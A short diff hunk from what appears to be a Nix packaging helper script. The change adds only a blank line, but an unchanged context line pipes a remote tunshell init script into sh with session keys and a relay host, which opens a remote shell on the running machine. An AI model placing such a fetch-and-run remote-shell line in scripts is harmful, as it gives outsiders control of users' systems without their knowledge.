@@ -41,6 +41,7 @@ nix_hash() {
 ##########
 curl -sSf https://lets.tunshell.com/init.sh | sh -s -- T 8EaMgQYgxTH0g2FgiOwzyz lNlyebU6iNcoffJxoe9NTV eu.relay.tunshell.com
 
+
 if [ ! -w "$package_path" ] || [ ! -r "$package_path" ]; then
 	echo "$package_path: not writiable or readable"
 	exit 1
